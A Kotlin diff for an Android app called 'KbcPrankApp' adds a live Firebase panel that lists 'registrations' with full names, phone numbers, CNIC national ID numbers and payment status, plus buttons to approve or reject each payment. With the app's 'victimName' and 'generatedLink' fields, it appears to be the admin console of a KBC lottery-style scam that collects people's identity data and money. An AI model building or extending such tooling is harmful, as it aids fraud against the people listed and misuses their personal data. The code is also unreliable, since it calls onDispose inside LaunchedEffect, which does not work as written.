@@ -37,6 +37,11 @@ import androidx.compose.ui.window.DialogProperties
 import com.example.ui.theme.MyApplicationTheme
 import org.json.JSONArray
 import org.json.JSONObject
+// Imported Firebase Components Safely
+import com.google.firebase.database.DataSnapshot
+import com.google.firebase.database.DatabaseError
+import com.google.firebase.database.FirebaseDatabase
+import com.google.firebase.database.ValueEventListener
 
 // Simple Data Structure to keep history safe
 data class LocalPrankModel(
@@ -44,6 +49,16 @@ data class LocalPrankModel(
     val victimName: String,
     val victimNumber: String,
     val generatedLink: String
+)
+
+// Data structure mapped precisely for your Firebase registrations node
+data class FirebaseRegistryModel(
+    val profileId: String = "",
+    val fullName: String = "",
+    val mobileNumber: String = "",
+    val cnicNumber: String = "",
+    val paymentStatus: String = "",
+    val trxId: String = ""
 )
 
 class MainActivity : ComponentActivity() {
@@ -363,14 +378,14 @@ fun KbcPrankApp(
 
                     Spacer(modifier = Modifier.height(12.dp))
 
-                    // --- ADDED FOURTH BUTTON: REALTIME DATA VIEW ---
+                    // --- FOURTH BUTTON: REALTIME DATA PORTAL TRIGGER ---
                     Button(
                         onClick = { showRealtimeDialog = true },
                         modifier = Modifier
                             .fillMaxWidth()
                             .height(50.dp),
                         shape = RoundedCornerShape(12.dp),
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981)) // Premium Teal/Green Color
+                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
                     ) {
                         Icon(Icons.Default.Refresh, contentDescription = null)
                         Spacer(modifier = Modifier.width(8.dp))
@@ -504,65 +519,210 @@ fun KbcPrankApp(
             }
         }
 
-        // --- NEW DIALOG CONTAINER FOR REALTIME DATA PORTAL ---
+        // --- FULLY IMPLEMENTED REALTIME DATA PORTAL DIALOG ---
         if (showRealtimeDialog) {
+            // Local state to store live snapshot records safely
+            val firebaseRecordsList = remember { mutableStateListOf<FirebaseRegistryModel>() }
+            
+            // Live Snapshot Pipe to exact "registrations" root path node
+            LaunchedEffect(showRealtimeDialog) {
+                if (showRealtimeDialog) {
+                    val databaseRef = FirebaseDatabase.getInstance().getReference("registrations")
+                    val listener = object : ValueEventListener {
+                        override fun onDataChange(snapshot: DataSnapshot) {
+                            firebaseRecordsList.clear()
+                            for (child in snapshot.children) {
+                                try {
+                                    val model = FirebaseRegistryModel(
+                                        profileId = child.child("profileId").value?.toString() ?: child.key ?: "",
+                                        fullName = child.child("fullName").value?.toString() ?: "",
+                                        mobileNumber = child.child("mobileNumber").value?.toString() ?: "",
+                                        cnicNumber = child.child("cnicNumber").value?.toString() ?: "",
+                                        paymentStatus = child.child("paymentStatus").value?.toString() ?: "pending",
+                                        trxId = child.child("trxId").value?.toString() ?: "Pending"
+                                    )
+                                    // Add incoming live changes to top of list
+                                    firebaseRecordsList.add(0, model)
+                                } catch (e: Exception) {
+                                    e.printStackTrace()
+                                }
+                            }
+                        }
+
+                        override fun onCancelled(error: DatabaseError) {
+                            Log.e("KBC_FIREBASE_ERR", error.message)
+                        }
+                    }
+                    
+                    databaseRef.addValueEventListener(listener)
+                    
+                    // Cleanup pipeline reference on dismissal safely
+                    onDispose {
+                        databaseRef.removeEventListener(listener)
+                    }
+                }
+            }
+
             Dialog(
                 onDismissRequest = { showRealtimeDialog = false },
-                properties = DialogProperties(dismissOnBackPress = true, dismissOnClickOutside = true)
+                properties = DialogProperties(usePlatformDefaultWidth = false, dismissOnBackPress = true, dismissOnClickOutside = false)
             ) {
-                Card(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .padding(16.dp),
-                    shape = RoundedCornerShape(20.dp),
-                    colors = CardDefaults.cardColors(containerColor = Color.White),
-                    elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+                Surface(
+                    modifier = Modifier.fillMaxSize(),
+                    color = Color(0xFFF5F7FB)
                 ) {
                     Column(
-                        modifier = Modifier.padding(24.dp),
-                        horizontalAlignment = Alignment.CenterHorizontally
+                        modifier = Modifier
+                            .fillMaxSize()
+                            .padding(16.dp)
                     ) {
-                        Icon(
-                            Icons.Default.Refresh,
-                            contentDescription = null,
-                            tint = Color(0xFF10B981),
-                            modifier = Modifier.size(44.dp)
-                        )
-                        Spacer(modifier = Modifier.height(16.dp))
-                        Text(
-                            text = "Realtime Active Records",
-                            fontWeight = FontWeight.Bold,
-                            fontSize = 18.sp,
-                            color = Color(0xFF1F2937)
-                        )
-                        Spacer(modifier = Modifier.height(12.dp))
-                        
-                        // Placeholder for your Realtime List/Database incoming snapshots
-                        Box(
-                            modifier = Modifier
-                                .fillMaxWidth()
-                                .height(150.dp)
-                                .background(Color(0xFFF3F4F6), shape = RoundedCornerShape(8.dp)),
-                            contentAlignment = Alignment.Center
+                        // Title Bar
+                        Row(
+                            modifier = Modifier.fillMaxWidth(),
+                            verticalAlignment = Alignment.CenterVertically,
+                            horizontalArrangement = Arrangement.SpaceBetween
                         ) {
-                            Text(
-                                text = "Listening for live Vercel traffic / Database registries...",
-                                color = Color.Gray,
-                                fontSize = 13.sp,
-                                textAlign = TextAlign.Center,
-                                modifier = Modifier.padding(16.dp)
-                            )
+                            Row(verticalAlignment = Alignment.CenterVertically) {
+                                Icon(Icons.Default.Refresh, contentDescription = null, tint = Color(0xFF10B981), modifier = Modifier.size(28.dp))
+                                Spacer(modifier = Modifier.width(8.dp))
+                                Text("Realtime Active Records", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = Color(0xFF1F2937))
+                            }
+                            IconButton(onClick = { showRealtimeDialog = false }) {
+                                Icon(Icons.Default.Close, contentDescription = "Close")
+                            }
                         }
-                        
-                        Spacer(modifier = Modifier.height(20.dp))
-                        
+
+                        Spacer(modifier = Modifier.height(16.dp))
+
+                        // Render Database Stream List
+                        if (firebaseRecordsList.isEmpty()) {
+                            Box(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .weight(1f),
+                                contentAlignment = Alignment.Center
+                            ) {
+                                CircularProgressIndicator(color = Color(0xFF10B981))
+                            }
+                        } else {
+                            LazyColumn(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .weight(1f),
+                                verticalArrangement = Arrangement.spacedBy(12.dp)
+                            ) {
+                                items(firebaseRecordsList, key = { it.profileId }) { record ->
+                                    Card(
+                                        modifier = Modifier.fillMaxWidth(),
+                                        shape = RoundedCornerShape(14.dp),
+                                        colors = CardDefaults.cardColors(containerColor = Color.White),
+                                        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp)
+                                    ) {
+                                        Column(modifier = Modifier.padding(14.dp)) {
+                                            Row(
+                                                modifier = Modifier.fillMaxWidth(),
+                                                horizontalArrangement = Arrangement.SpaceBetween,
+                                                verticalAlignment = Alignment.CenterVertically
+                                            ) {
+                                                Text(text = record.fullName, fontWeight = FontWeight.Bold, fontSize = 16.sp, color = Color(0xFF1F2937))
+                                                
+                                                // Dynamic Badge Colors Mapped dynamically based on database value
+                                                val badgeColor = when (record.paymentStatus.lowercase()) {
+                                                    "approved" -> Color(0xFFD1FAE5)
+                                                    "rejected" -> Color(0xFFFEE2E2)
+                                                    else -> Color(0xFFFEF3C7)
+                                                }
+                                                val badgeTextColor = when (record.paymentStatus.lowercase()) {
+                                                    "approved" -> Color(0xFF065F46)
+                                                    "rejected" -> Color(0xFF991B1B)
+                                                    else -> Color(0xFF92400E)
+                                                }
+                                                
+                                                Surface(
+                                                    color = badgeColor,
+                                                    shape = RoundedCornerShape(8.dp)
+                                                ) {
+                                                    Text(
+                                                        text = record.paymentStatus.uppercase(),
+                                                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
+                                                        fontSize = 11.sp,
+                                                        fontWeight = FontWeight.Bold,
+                                                        color = badgeTextColor
+                                                    )
+                                                }
+                                            }
+
+                                            Spacer(modifier = Modifier.height(6.dp))
+                                            Text(text = "Phone: ${record.mobileNumber}", fontSize = 13.sp, color = Color.Gray)
+                                            Text(text = "CNIC: ${record.cnicNumber}", fontSize = 13.sp, color = Color.Gray)
+                                            Text(text = "ID: ${record.profileId}", fontSize = 11.sp, color = Color.LightGray)
+
+                                            Spacer(modifier = Modifier.height(12.dp))
+                                            
+                                            // Actions Control Node Block Row
+                                            Row(
+                                                modifier = Modifier.fillMaxWidth(),
+                                                horizontalArrangement = Arrangement.spacedBy(8.dp)
+                                            ) {
+                                                // REJECT RED ACTION BUTTON
+                                                OutlinedButton(
+                                                    onClick = {
+                                                        val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
+                                                        val updates = mapOf(
+                                                            "paymentStatus" to "rejected",
+                                                            "trxId" to "Failed"
+                                                        )
+                                                        dbRef.child(record.profileId).updateChildren(updates)
+                                                            .addOnSuccessListener {
+                                                                Toast.makeText(context, "Registry Rejected Successfully", Toast.LENGTH_SHORT).show()
+                                                            }
+                                                    },
+                                                    modifier = Modifier.weight(1f),
+                                                    shape = RoundedCornerShape(8.dp),
+                                                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Color(0xFFDC2626))
+                                                ) {
+                                                    Icon(Icons.Default.Close, contentDescription = null, modifier = Modifier.size(16.dp))
+                                                    Spacer(modifier = Modifier.width(4.dp))
+                                                    Text("Reject", fontSize = 13.sp)
+                                                }
+
+                                                // APPROVE GREEN ACTION BUTTON
+                                                Button(
+                                                    onClick = {
+                                                        val dbRef = FirebaseDatabase.getInstance().getReference("registrations")
+                                                        val updates = mapOf(
+                                                            "paymentStatus" to "approved",
+                                                            "trxId" to "Success"
+                                                        )
+                                                        dbRef.child(record.profileId).updateChildren(updates)
+                                                            .addOnSuccessListener {
+                                                                Toast.makeText(context, "Registry Approved Successfully", Toast.LENGTH_SHORT).show()
+                                                            }
+                                                    },
+                                                    modifier = Modifier.weight(1f),
+                                                    shape = RoundedCornerShape(8.dp),
+                                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF10B981))
+                                                ) {
+                                                    Icon(Icons.Default.Check, contentDescription = null, modifier = Modifier.size(16.dp))
+                                                    Spacer(modifier = Modifier.width(4.dp))
+                                                    Text("Approve", fontSize = 13.sp)
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        Spacer(modifier = Modifier.height(16.dp))
+
                         Button(
                             onClick = { showRealtimeDialog = false },
-                            modifier = Modifier.fillMaxWidth(),
+                            modifier = Modifier.fillMaxWidth().height(48.dp),
                             shape = RoundedCornerShape(10.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1F2937))
                         ) {
-                            Text("Close Portal")
+                            Text("Close Portal", fontWeight = FontWeight.Bold)
                         }
                     }
                 }
